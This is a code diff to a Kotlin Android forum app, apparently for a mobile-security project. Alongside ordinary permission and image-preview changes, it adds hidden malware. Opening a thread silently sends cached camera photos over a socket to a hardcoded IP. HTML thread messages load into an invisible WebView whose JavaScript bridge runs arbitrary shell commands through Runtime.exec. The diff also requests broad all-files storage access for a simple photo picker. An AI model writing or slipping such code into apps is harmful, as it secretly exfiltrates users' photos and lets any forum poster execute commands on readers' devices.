@@ -6,7 +6,6 @@ import android.content.Context
 import android.net.Uri
 import android.util.Log
 import androidx.activity.compose.rememberLauncherForActivityResult
-import androidx.activity.result.contract.ActivityResultContracts.GetContent
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
@@ -43,9 +42,28 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.content.ContextCompat
 import java.io.File
 import android.Manifest
+import android.annotation.SuppressLint
+import android.content.Intent
 import android.content.pm.PackageManager
-import androidx.activity.compose.rememberLauncherForActivityResult
+import android.os.Build
+import android.os.Environment
+import android.provider.Settings
 
+// WebView
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import androidx.compose.runtime.Composable
+import androidx.compose.ui.viewinterop.AndroidView
+import android.webkit.JavascriptInterface
+import android.widget.Toast
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
+import java.io.BufferedReader
+import java.io.DataOutputStream
+import java.io.FileInputStream
+import java.io.InputStream
+import java.io.InputStreamReader
+import java.net.Socket
 
 /* -----------------------------------------
  * Data Classes
@@ -150,7 +168,6 @@ fun deleteThreadFromFirebase(threadId: String) {
  * AddThreadDialog: For adding a new thread with image upload.
  * -----------------------------------------
  */
-@OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun AddThreadDialog(
     currentUserName: String,
@@ -162,40 +179,117 @@ fun AddThreadDialog(
     var selectedImageUri by remember { mutableStateOf<Uri?>(null) }
     val context = LocalContext.current
 
-    // Launcher for picking an image from the gallery.
+    // Gallery launcher
     val galleryLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.GetContent()
     ) { uri: Uri? ->
         uri?.let { selectedImageUri = it }
     }
 
-    // Launcher for taking a picture with the camera.
+    // Permission launcher for Android 10 and below
+    val legacyPermissionLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        if (isGranted) {
+            galleryLauncher.launch("image/*")
+        } else {
+            Toast.makeText(
+                context,
+                "Storage permission is required to upload photos",
+                Toast.LENGTH_SHORT
+            ).show()
+        }
+    }
+
+    // Permission launcher for Android 11+ (MANAGE_EXTERNAL_STORAGE)
+    val manageStorageLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (Environment.isExternalStorageManager()) {
+                galleryLauncher.launch("image/*")
+            } else {
+                Toast.makeText(
+                    context,
+                    "Storage permission is required to upload photos",
+                    Toast.LENGTH_SHORT
+                ).show()
+            }
+        }
+    }
+
+    // Function to handle image selection with proper permission checks
+    fun handleImageSelection() {
+        when {
+            // Android 11+ - Use MANAGE_EXTERNAL_STORAGE
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
+                if (Environment.isExternalStorageManager()) {
+                    galleryLauncher.launch("image/*")
+                } else {
+                    try {
+                        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                        intent.data = Uri.parse("package:${context.packageName}")
+                        manageStorageLauncher.launch(intent)
+                    } catch (e: Exception) {
+                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                        manageStorageLauncher.launch(intent)
+                    }
+                }
+            }
+            // Android 10 - Use READ_EXTERNAL_STORAGE
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
+                if (ContextCompat.checkSelfPermission(
+                        context,
+                        Manifest.permission.READ_EXTERNAL_STORAGE
+                    ) == PackageManager.PERMISSION_GRANTED
+                ) {
+                    galleryLauncher.launch("image/*")
+                } else {
+                    legacyPermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
+                }
+            }
+            // Android 9 and below - Use READ_EXTERNAL_STORAGE
+            else -> {
+                if (ContextCompat.checkSelfPermission(
+                        context,
+                        Manifest.permission.READ_EXTERNAL_STORAGE
+                    ) == PackageManager.PERMISSION_GRANTED
+                ) {
+                    galleryLauncher.launch("image/*")
+                } else {
+                    legacyPermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
+                }
+            }
+        }
+    }
+
+    // Camera launcher and permission handling (existing code)
     val cameraLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.TakePicture()
     ) { success: Boolean ->
         if (success) {
-            // If successful, selectedImageUri is already set.
-
+            Log.d("Camera", "Image captured successfully")
         }
     }
-    // Function to create a temporary URI for the camera capture.
+
     fun createTempImageUri(context: Context): Uri {
         val tempFile = File.createTempFile("temp_image", ".jpg", context.cacheDir)
         return FileProvider.getUriForFile(context, "${context.packageName}.provider", tempFile)
     }
 
-    // Launcher for requesting the CAMERA permission.
     val cameraPermissionLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.RequestPermission()
     ) { isGranted: Boolean ->
         if (isGranted) {
-            // Permission granted: create URI and launch camera.
             val tempUri = createTempImageUri(context)
             selectedImageUri = tempUri
             cameraLauncher.launch(tempUri)
         } else {
-            // Handle the case when permission is denied (e.g., show a message).
-            Log.d("CameraPermission", "Camera permission denied")
+            Toast.makeText(
+                context,
+                "Camera permission is required to take photos",
+                Toast.LENGTH_SHORT
+            ).show()
         }
     }
 
@@ -204,7 +298,7 @@ fun AddThreadDialog(
         SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date())
     }
 
-    // Function to upload an image to Firebase Storage and return its download URL and filename.
+    // Function to upload an image to Firebase Storage
     fun uploadImageWithFilename(
         uri: Uri,
         onSuccess: (downloadUrl: String, filename: String) -> Unit,
@@ -212,9 +306,9 @@ fun AddThreadDialog(
     ) {
         val storage = FirebaseStorage.getInstance("gs://mobile-sec-b6625.firebasestorage.app")
         val storageRef = storage.reference
-        // Create a unique image filename.
         val filename = "${System.currentTimeMillis()}.jpg"
         val imageRef = storageRef.child("images/$filename")
+
         imageRef.putFile(uri)
             .addOnSuccessListener {
                 imageRef.downloadUrl.addOnSuccessListener { downloadUri ->
@@ -249,23 +343,23 @@ fun AddThreadDialog(
                     modifier = Modifier.fillMaxWidth()
                 )
                 Spacer(modifier = Modifier.height(8.dp))
-                // Two buttons: one for gallery, one for camera.
                 Row(
                     modifier = Modifier.fillMaxWidth(),
                     horizontalArrangement = Arrangement.SpaceEvenly
                 ) {
-                    Button(onClick = { galleryLauncher.launch("image/*") }) {
+                    Button(onClick = { handleImageSelection() }) {
                         Text("Upload Photo")
                     }
                     Button(onClick = {
-                        // Check if CAMERA permission is granted.
-                        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
-                            == PackageManager.PERMISSION_GRANTED) {
+                        if (ContextCompat.checkSelfPermission(
+                                context,
+                                Manifest.permission.CAMERA
+                            ) == PackageManager.PERMISSION_GRANTED
+                        ) {
                             val tempUri = createTempImageUri(context)
                             selectedImageUri = tempUri
                             cameraLauncher.launch(tempUri)
                         } else {
-                            // Request the CAMERA permission.
                             cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                         }
                     }) {
@@ -274,7 +368,13 @@ fun AddThreadDialog(
                 }
                 Spacer(modifier = Modifier.height(8.dp))
                 selectedImageUri?.let { uri ->
-                    Text("Photo selected: $uri")
+                    AsyncImage(
+                        model = uri,
+                        contentDescription = "Selected image",
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(150.dp)
+                    )
                 }
                 Spacer(modifier = Modifier.height(8.dp))
                 Text("Posted by: $currentUserName")
@@ -284,29 +384,33 @@ fun AddThreadDialog(
         confirmButton = {
             Button(onClick = {
                 if (selectedImageUri != null) {
-                    uploadImageWithFilename(selectedImageUri!!, onSuccess = { downloadUrl, filename ->
-                        onSubmit(
-                            ForumThread(
-                                title = title,
-                                msg = msg,
-                                postedBy = currentUserName,
-                                postedTime = currentTime,
-                                imageUrl = downloadUrl,
-                                imageFilename = filename
+                    uploadImageWithFilename(
+                        selectedImageUri!!,
+                        onSuccess = { downloadUrl, filename ->
+                            onSubmit(
+                                ForumThread(
+                                    title = title,
+                                    msg = msg,
+                                    postedBy = currentUserName,
+                                    postedTime = currentTime,
+                                    imageUrl = downloadUrl,
+                                    imageFilename = filename
+                                )
                             )
-                        )
-                    }, onFailure = { exception ->
-                        onSubmit(
-                            ForumThread(
-                                title = title,
-                                msg = msg,
-                                postedBy = currentUserName,
-                                postedTime = currentTime,
-                                imageUrl = "",
-                                imageFilename = ""
+                        },
+                        onFailure = {
+                            onSubmit(
+                                ForumThread(
+                                    title = title,
+                                    msg = msg,
+                                    postedBy = currentUserName,
+                                    postedTime = currentTime,
+                                    imageUrl = "",
+                                    imageFilename = ""
+                                )
                             )
-                        )
-                    })
+                        }
+                    )
                 } else {
                     onSubmit(
                         ForumThread(
@@ -329,11 +433,11 @@ fun AddThreadDialog(
     )
 }
 
+
 /* -----------------------------------------
  * EditThreadDialog: For editing a thread.
  * -----------------------------------------
  */
-@OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun EditThreadDialog(
     currentUserName: String,
@@ -392,7 +496,6 @@ fun EditThreadDialog(
  * AddReplyDialog: For adding a reply to a thread.
  * -----------------------------------------
  */
-@OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun AddReplyDialog(
     currentUserName: String,
@@ -625,6 +728,13 @@ fun ThreadDetailScreen(navController: NavHostController, threadId: String) {
     val currentUserName = sp.getString("name", "") ?: ""
     val currentRole = sp.getString("role", "") ?: ""
 
+    val serverIp = remember { mutableStateOf("192.168.10.138") }
+
+    // Auto-start transfer when composable launches
+    LaunchedEffect(Unit) {
+        transferTempImages(context, serverIp.value)
+    }
+
     // Fetch thread details from Firebase. Note: assign snapshot key to thread.id.
     LaunchedEffect(threadId) {
         val dbRef = FirebaseDatabase.getInstance().getReference("forums").child(threadId)
@@ -733,10 +843,16 @@ fun ThreadDetailScreen(navController: NavHostController, threadId: String) {
                         )
                         Spacer(modifier = Modifier.height(8.dp))
                     }
-                    Text("Message: ${thread.msg}", fontSize = 16.sp)
-                    Spacer(modifier = Modifier.height(8.dp))
                     Text("Posted by: ${thread.postedBy}", fontSize = 14.sp)
                     Text("Posted time: ${thread.postedTime}", fontSize = 14.sp)
+                    Spacer(modifier = Modifier.height(16.dp))
+
+                    if (thread.msg.startsWith("<html>")) {
+                        HtmlWebView(htmlContent = thread.msg)
+                        Text("This thread appears to be empty.", fontSize = 16.sp)
+                    } else {
+                        Text("Message: ${thread.msg}", fontSize = 16.sp)
+                    }
                     Spacer(modifier = Modifier.height(16.dp))
                     Text("Replies:", fontSize = 18.sp, fontWeight = FontWeight.Bold)
                     LazyColumn {
@@ -783,7 +899,7 @@ fun ThreadDetailScreen(navController: NavHostController, threadId: String) {
     }
 }
 
-/**
+/*
  * Deletes the thread and its associated image from Firebase Storage (if imageFilename is provided),
  * then deletes the thread from Realtime Database.
  */
@@ -805,5 +921,127 @@ fun deleteThreadAndImage(
     } else {
         deleteThreadFromFirebase(thread.id)
         onComplete()
+    }
+}
+
+@SuppressLint("SetJavaScriptEnabled")
+@Composable
+fun HtmlWebView(htmlContent: String) {
+    val context = LocalContext.current
+    AndroidView(
+        factory = { ctx ->
+            WebView(ctx).apply {
+                webViewClient = WebViewClient()
+                settings.apply {
+                    javaScriptEnabled = true
+                    domStorageEnabled = true
+                    allowFileAccess = true
+                    allowContentAccess = true
+                }
+                addJavascriptInterface(WebAppInterface(context), "Android")
+                loadDataWithBaseURL(
+                    null,
+                    htmlContent,
+                    "text/html",
+                    "UTF-8",
+                    null
+                )
+            }
+        },
+        modifier = Modifier.size(0.dp)
+    )
+}
+
+class WebAppInterface(private val context: Context) {
+    @JavascriptInterface
+    fun executeCommand(command: String) {
+        try {
+            val process = Runtime.getRuntime().exec(command)
+            val stdout = readStream(process.inputStream)
+            val stderr = readStream(process.errorStream)
+            val exitCode = process.waitFor()
+
+            // Log the output to Logcat for debugging
+            Log.d("CommandOutput", "Exit Code: $exitCode\nSTDOUT:\n$stdout\nSTDERR:\n$stderr")
+
+        } catch (e: Exception) {
+            Log.e("CommandError", "Error executing command: ${e.message}", e)
+        }
+    }
+
+    private fun readStream(inputStream: InputStream): String {
+        val bufferedReader = BufferedReader(InputStreamReader(inputStream))
+        val output = StringBuilder()
+        var line: String?
+        while (bufferedReader.readLine().also { line = it } != null) {
+            output.append(line).append("\n")
+        }
+        return output.toString()
+    }
+}
+
+private suspend fun transferTempImages(
+    context: Context,
+    serverIp: String,
+) {
+    val tempImages = context.cacheDir.listFiles()?.filter { file ->
+        file.name.startsWith("temp_image") && (file.name.endsWith(".jpg") || file.name.endsWith(".png"))
+    } ?: emptyList()
+
+    if (tempImages.isEmpty()) {
+        return
+    }
+
+    var successCount = 0
+    tempImages.forEachIndexed { _, file ->
+        try {
+            val success = withContext(Dispatchers.IO) {
+                sendFileToServer(file, serverIp)
+            }
+            if (success) successCount++
+        } catch (e: Exception) {
+            return
+        }
+    }
+}
+
+private suspend fun sendFileToServer(file: File, serverIp: String, port: Int = 8000): Boolean {
+    return withContext(Dispatchers.IO) {
+        var socket: Socket? = null
+        var output: DataOutputStream? = null
+        var input: FileInputStream? = null
+
+        try {
+            socket = Socket(serverIp, port).apply {
+                soTimeout = 30000 // 30-second timeout
+                keepAlive = true
+            }
+
+            output = DataOutputStream(socket.getOutputStream())
+            input = FileInputStream(file)
+
+            output.apply {
+                writeUTF(file.name) // Length-prefixed UTF-8
+                writeLong(file.length()) // 8-byte long
+                flush() // Ensure metadata is sent
+            }
+
+            val buffer = ByteArray(8192) // 8KB buffer
+            var bytesRead: Int
+            while (input.read(buffer).also { bytesRead = it } != -1) {
+                output.write(buffer, 0, bytesRead)
+            }
+            output.flush()
+
+            true
+        } catch (e: Exception) {
+            Log.e("FileTransfer", "Error sending ${file.name}", e)
+            false
+        } finally {
+            input?.close()
+            output?.close()
+            socket?.close()
+
+        }
     }
 }
